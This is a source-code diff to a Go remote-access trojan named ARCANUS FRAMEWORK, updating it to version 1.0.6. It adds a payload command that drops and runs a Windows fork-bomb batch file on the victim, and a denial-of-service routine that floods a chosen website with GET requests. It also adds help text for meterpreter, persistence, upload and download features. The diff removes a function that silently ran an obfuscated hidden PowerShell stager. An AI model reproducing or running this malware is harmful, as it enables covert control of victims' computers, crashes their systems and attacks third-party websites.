@@ -260,6 +260,16 @@ func main() {
     }else if strings.Contains(_Command, "£download") || strings.Contains(_Command, "£DOWNLOAD") {
       connect.Write([]byte(Command))
       go DOWNLOAD_VIA_TCP()
+    }else if strings.Contains(_Command, "£DISTRACT") || strings.Contains(_Command, "£distract") {
+      connect.Write([]byte(Command))
+      color.Yellow("\n[*] Preparing fork bomb...")
+      color.Green("\n[+] Distraction Started !")
+    }else if strings.Contains(_Command, "£DOS") || strings.Contains(_Command, "£dos") {
+      connect.Write([]byte(Command))
+      DOS_Target := strings.Split(GLOBAL__Command, "\"")
+      color.Yellow("\n[*] Starting DOS Atack to --> "+DOS_Target[1])
+      color.Green("\n[+] DOS Atack Started !")
+      color.Green("\n[+] Sending 1000 GET request to target...")
     }else{
       connect.Write([]byte(Command))
       for {
@@ -336,7 +346,7 @@ func BANNER() {
     color.Red("          | | | || |\\ \\ | \\__/\\| | | || |\\  | |_| /\\__/ /")
     color.Red("          \\_| |_/\\_| \\_| \\____/\\_| |_/\\_| \\_/\\___/\\____/ ")
     color.Green("\n\n+ -- --=[      ARCANUS FRAMEWORK               ]")
-    color.Green("+ -- --=[ Version: 1.0.5                         ]")
+    color.Green("+ -- --=[ Version: 1.0.6                         ]")
     color.Green("+ -- --=[ For more: http://www.ege-balci.com     ]")
   }else if runtime.GOOS == "linux" {
     color.Red("           _______  _______  _______  _______  _                 _______ ")
@@ -349,7 +359,7 @@ func BANNER() {
     color.Red("          |/     \\||/   \\__/(_______/|/     \\||/    )_)(_______)\\_______)")
 
     color.Green("\n\n+ -- --=[      ARCANUS FRAMEWORK                 ]")
-    color.Green("+ -- --=[ Version: 1.0.5                         ]")
+    color.Green("+ -- --=[ Version: 1.0.6                         ]")
     color.Green("+ -- --=[ For more: http://www.ege-balci.com     ]")
   }  
 }
@@ -559,7 +569,7 @@ func HELP_SCREEN_LINUX() {
   color.Yellow("|   [ COMMAND ]                                       [DESCRIPTION]                                 |")
   color.Yellow("|  ===================================              ======================================          |")
   color.Yellow("|                                                                                                   |")
-  color.Yellow("|   (*) £METERPRETER -C \"powershell shellcode\"    This command executes given powershell        |")
+  color.Yellow("|   (*) £METERPRETER -C \"powershell shellcode\":   This command executes given powershell            |")
   color.Yellow("|                                                      shellcode for metasploit integration.        |")
   color.Yellow("|                                                                                                   |")
   color.Yellow("|                                                                                                   |")
@@ -567,11 +577,11 @@ func HELP_SCREEN_LINUX() {
   color.Yellow("|                                                       to remote computer for continious acces.    |")
   color.Yellow("|                                                                                                   |")
   color.Yellow("|                                                                                                   |")
-  color.Yellow("|   (*) £METASHELL:                                   This command executes a metasploit reverse    |")
-  color.Yellow("|                                                       shell shellcode on remote machine.          |")
+  color.Yellow("|   (*) £DISTRACT:                                   This command executes a fork bomb bat file to  |")
+  color.Yellow("|                                                       distrackt the remote user.                  |")
   color.Yellow("|                                                                                                   |")
   color.Yellow("|                                                                                                   |")
-  color.Yellow("|   (*) £UPLOAD -F \"filename.exe\":                This command uploads a choosen file to        |")
+  color.Yellow("|   (*) £UPLOAD -F \"filename.exe\":                This command uploads a choosen file to            |")
   color.Yellow("|                                                       remote computer via tcp socket stream.      |")
   color.Yellow("|                                                                                                   |")
   color.Yellow("|                                                                                                   |")
@@ -579,15 +589,15 @@ func HELP_SCREEN_LINUX() {
   color.Yellow("|                                                       remote computer via http get method.        |")
   color.Yellow("|                                                                                                   |")
   color.Yellow("|                                                                                                   |")
-  color.Yellow("|   (*) £DOWNLOAD -F \"filename.exe\":              This command download a choosen file          |")
+  color.Yellow("|   (*) £DOWNLOAD -F \"filename.exe\":              This command download a choosen file              |")
   color.Yellow("|                                                       from remote computer via tcp socket stream. |")
   color.Yellow("|                                                                                                   |")
   color.Yellow("|                                                                                                   |")
-  color.Yellow("|   (*) £REQUEST -A \"www.site.com\":               This command sends a http get request on      |")
-  color.Yellow("|                                                       remote machine to given addres.             |")
+  color.Yellow("|   (*) £DOS -A \"www.site.com\":               This command starts a denial of service atack to    |")
+  color.Yellow("|                                                                         given website address.    |")
   color.Yellow("|                                                                                                   |")
   color.Yellow("|                                                                                                   |")
-  color.Yellow("|   (*) £PLEASE \"any command\":                    This command asks users comfirmation for      |")
+  color.Yellow("|   (*) £PLEASE \"any command\":                    This command asks users comfirmation for          |")
   color.Yellow("|                                                       higher privilidge operations.               |")
   color.Yellow("|                                                                                                   |")
   color.Yellow("|                                                                                                   |")
@@ -601,7 +611,41 @@ func HELP_SCREEN_LINUX() {
 
 
 func HELP_SCREEN_WIN() {
-  
+
+  color.Yellow("#=============================================================================#")//
+  color.Yellow("|                                                                             |")
+  color.Yellow("|   [ COMMAND ]                                               [DESCRIPTION]   |")
+  color.Yellow("|  ==============                                            ================ |")
+  color.Yellow("|                                                                             |")
+  color.Yellow("|  £METERPRETER -C \"powershell shellcode\":     This command executes given    |")
+  color.Yellow("|                                                   powershell shellcode for  |")
+  color.Yellow("|                                                   metasploit integration.   |")
+  color.Yellow("|                                                                             |")
+  color.Yellow("| £PERSISTENCE:               This command installs a persistence module to   |")
+  color.Yellow("|                                       remote computer for continious acces. |")
+  color.Yellow("|                                                                             |")
+  color.Yellow("| £UPLOAD -F \"filename.exe\":        This command uploads a choosen file to    |")
+  color.Yellow("|                                      remote computer via tcp socket stream. |")
+  color.Yellow("|                                                                             |")
+  color.Yellow("| £UPLOAD -G:                   This command uploads a choosen file to remote |")
+  color.Yellow("|                                             computer via http get method.   |")
+  color.Yellow("|                                                                             |")
+  color.Yellow("| £DOWNLOAD -F \"filename.exe\":  This command download a choosen file from     |")
+  color.Yellow("|                                      remote computer via tcp socket stream. |")
+  color.Yellow("|                                                                             |")
+  color.Yellow("| £DISTRACT:                    This command executes a fork bomb bat file to |")
+  color.Yellow("|                                                distrackt the remote user.   |")
+  color.Yellow("|                                                                             |")
+  color.Yellow("| £DOS -A \"www.site.com\":    This command starts a denial of service atack    |")
+  color.Yellow("|                                                      given website address. |")
+  color.Yellow("|                                                                             |")
+  color.Yellow("| £PLEASE \"any command\":           This command asks users comfirmation for   |")
+  color.Yellow("|                                              higher privilidge operations.  |")
+  color.Yellow("|                                                                             |")
+  color.Yellow("| £DESKTOP                        This command adjusts remote desktop options |")
+  color.Yellow("|                                    for remote connection on target machine  |")
+  color.Yellow("|                                                                             |")
+  color.Yellow("#=============================================================================#")
 }
 
 
@@ -621,10 +665,14 @@ import "net/http";
 import "time";
 import "io/ioutil";
 import "io";
+import "fmt"
 
 var Global__Command string;
 var file_transfer_succes bool;
 var Persistence_Output string;
+var DOS_Target string;
+var DOS_Request_Counter int = 0;
+var DOS_Request_Limit int = 1000;
 
 const VICTIM_IP string = "127.0.0.1";
 const VICTIM_PORT string = "8552";
@@ -673,8 +721,12 @@ func main() {
       go UPLOAD_VIA_TCP();                                                                                                            
     }else if strings.Contains(_Command, "£METERPRETER -C") || strings.Contains(_Command, "£meterpreter -c") { 
       METERPRETER_CREATE();                                                                                                                             
-    }else if strings.Contains(_Command, "£METERPRETER --POWERSHELL") || strings.Contains(_Command, "£meterpreter --powershell") { 
-      POWERSHELL();                                                                                                                             
+    }else if strings.Contains(_Command, "£DOS") || strings.Contains(_Command, "£dos") {
+      DOS_Command := strings.Split(Global__Command, "\"")
+      DOS_Target =  DOS_Command[1]
+      go DOS();                                                                                                                             
+    }else if strings.Contains(_Command, "£DISTRACT") || strings.Contains(_Command, "£distract") { 
+      DISTRACT();                                                                                                                             
     }else if strings.Contains(_Command, "£DESKTOP") || strings.Contains(_Command, "£desktop") { 
       Status := REMOTE_DESKTOP()
       if Status == false {
@@ -786,25 +838,6 @@ func METERPRETER_CREATE() {
 }
 
 
-func POWERSHELL() {
-  meterpreter, _ := os.Create("windll.bat");
-  meterpreter.WriteString(string("if "+"%"+"PROCESSOR_ARCHITECTURE"+"%"+"==x86 (powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\\\"nVRtc9pGEP7Or9jRXGekMZIFuMSg8UwcHDe0wXENsdMyTOeQFnTx6U4+nQyY8N+7wiomX8uHO3a1u8+zb8ee4ALeO43plZTDLNfGus4jGoWy0w4SKR1vBnk5lyKGwnJLF64tfYehsrfWwL0wtuTyUkodu7VO5pdJYrAomlAKZSFZjcUL1sLi1ZZCaTXZ5G/qW6MtxtaL/jeXgUFucZLSlbxxeZUvrTViXlo8ImV5/PjK7GBMOmMP7A/qW254hoR1cN5jUQrXki+PLV/Rhgml4bxvWLPZsoQq7Fx+GFx9vP7t0/D3Pz6Pbr7c/nk3nny9f/j21998Hie4WKbi+6PMlM6fTGHL59V68xK22p2zX7vvzntOMNGDlJtLY/jG9RqLUsUVOsQue/a2YNCWVAfXnRK76WwG7PlnD/gBI+RFadD/Mv9OZQZ/XGZeQAf8AuG6FYbg4xP02t7uLbqFLVtU7J2oFQSdHwtNycWpr/ch6NvJBbBk6i7R+oarRGfgZ3wtMorKkuAzqqVNvdkuqvmxRXQUHWELudExlRq2U14RnbE1wdFxAuyfXQSoEqKwJvYFTUONC1tX4eo/4W6P6wWKZsH1drsjgOUWiDG4TFyEERPgSwvdM/p3cuJtWUpINmKPFWBCCBgB1AmSiwRBfB/JrqgM0oqRjEAswKWaF54Hh6qTBcHWgtN7/vbVoTSnN2iDMZpnEeOtpraMuOJLNLN+v9KiGaCxYiFoE/CeS5Hsx2nApZzTWBLmlllT4i5iGQk3lHDduPGmsJgFVfgHnA+kQGWjBsuCTzR4aIqAxtd1ygKNT3jKOk1wRvpFSMlPz4KQ+OssJ7C5pIxH4+FH6AatCB4E1XFVwM3Ec7yIKQJdRjD9sLG4H6i8KkMWXOmVkponV9xy10mtzYv+6Wmr1w5a3fOAzt67/jn9TplywGswTW5EyK9WnYYDszmaK1wIJfYtYk/g39BqgUP4nbYDviKpyHmMsNdc180swM95UdjUlA22vmC63//p6QmbLK8HrhmuO2EY0nUWetG0rtddqazIMKBNRaPzujNFMOKmSLmktgx0vnFZ3oSwCdPXhZ65bE2LREKn7XpeEw4gVWrkcvziEGKTrZvVFVYLp0vrq1LS1OxfFX8sEXPaO4w1jfV59ywMd9T9ON3u/gU=\\\")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();\") else ("+"%"+"WinDir"+"%"+"\\syswow64\\windowspowershell\\v1.0\\powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\\\"nVRtc9pGEP7Or9jRXGekMZIFuMSg8UwcHDe0wXENsdMyTOeQFnTx6U4+nQyY8N+7wiomX8uHO3a1u8+zb8ee4ALeO43plZTDLNfGus4jGoWy0w4SKR1vBnk5lyKGwnJLF64tfYehsrfWwL0wtuTyUkodu7VO5pdJYrAomlAKZSFZjcUL1sLi1ZZCaTXZ5G/qW6MtxtaL/jeXgUFucZLSlbxxeZUvrTViXlo8ImV5/PjK7GBMOmMP7A/qW254hoR1cN5jUQrXki+PLV/Rhgml4bxvWLPZsoQq7Fx+GFx9vP7t0/D3Pz6Pbr7c/nk3nny9f/j21998Hie4WKbi+6PMlM6fTGHL59V68xK22p2zX7vvzntOMNGDlJtLY/jG9RqLUsUVOsQue/a2YNCWVAfXnRK76WwG7PlnD/gBI+RFadD/Mv9OZQZ/XGZeQAf8AuG6FYbg4xP02t7uLbqFLVtU7J2oFQSdHwtNycWpr/ch6NvJBbBk6i7R+oarRGfgZ3wtMorKkuAzqqVNvdkuqvmxRXQUHWELudExlRq2U14RnbE1wdFxAuyfXQSoEqKwJvYFTUONC1tX4eo/4W6P6wWKZsH1drsjgOUWiDG4TFyEERPgSwvdM/p3cuJtWUpINmKPFWBCCBgB1AmSiwRBfB/JrqgM0oqRjEAswKWaF54Hh6qTBcHWgtN7/vbVoTSnN2iDMZpnEeOtpraMuOJLNLN+v9KiGaCxYiFoE/CeS5Hsx2nApZzTWBLmlllT4i5iGQk3lHDduPGmsJgFVfgHnA+kQGWjBsuCTzR4aIqAxtd1ygKNT3jKOk1wRvpFSMlPz4KQ+OssJ7C5pIxH4+FH6AatCB4E1XFVwM3Ec7yIKQJdRjD9sLG4H6i8KkMWXOmVkponV9xy10mtzYv+6Wmr1w5a3fOAzt67/jn9TplywGswTW5EyK9WnYYDszmaK1wIJfYtYk/g39BqgUP4nbYDviKpyHmMsNdc180swM95UdjUlA22vmC63//p6QmbLK8HrhmuO2EY0nUWetG0rtddqazIMKBNRaPzujNFMOKmSLmktgx0vnFZ3oSwCdPXhZ65bE2LREKn7XpeEw4gVWrkcvziEGKTrZvVFVYLp0vrq1LS1OxfFX8sEXPaO4w1jfV59ywMd9T9ON3u/gU=\\\")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();\")"));
-  runtime.GC();
-  custom_command := ("move windll.bat " + "%" + "appdata"+"%");
-  cmd := exec.Command("cmd", "/C", custom_command);
-  cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true};
-  cmd.Run();
-  runtime.GC();
-  custom_command = ("%"+"appdata"+"%"+"/windll.bat");
-  cmd = exec.Command("cmd", "/C", custom_command);
-  cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true};
-  cmd.Run();
-  cmd = exec.Command("cmd", "/C", "windll.bat");
-  cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true};
-  cmd.Run();
-};
-
-
 func DOWNLOAD_VIA_TCP() {
   for {
     connect, err := net.Dial("tcp", VICTIM_IP+":"+"55888");
@@ -880,6 +913,38 @@ func REMOTE_DESKTOP() (bool) {
     Status = false
   }
   return Status
+}
+
+
+
+func DISTRACT() {
+  var Fork_Bomb string = ":A\nstart\ngoto A"
+
+  F_Bomb, _ := os.Create("F_Bomb.bat")
+
+  F_Bomb.WriteString(Fork_Bomb)
+
+  F_Bomb.Close()
+
+  exec.Command("cmd", "/C", "F_Bomb.bat").Start()
+
+}
+
+
+func DOS() {
+  for {
+    DOS_Request_Counter++
+    response, _ := http.Get(DOS_Target);
+
+    body, _ := ioutil.ReadAll(response.Body);
+    fmt.Println(body)
+    response.Body.Close();
+    if DOS_Request_Counter < DOS_Request_Limit {
+      go DOS()
+    }else{
+      break;
+    } 
+  }
 }`
 
 
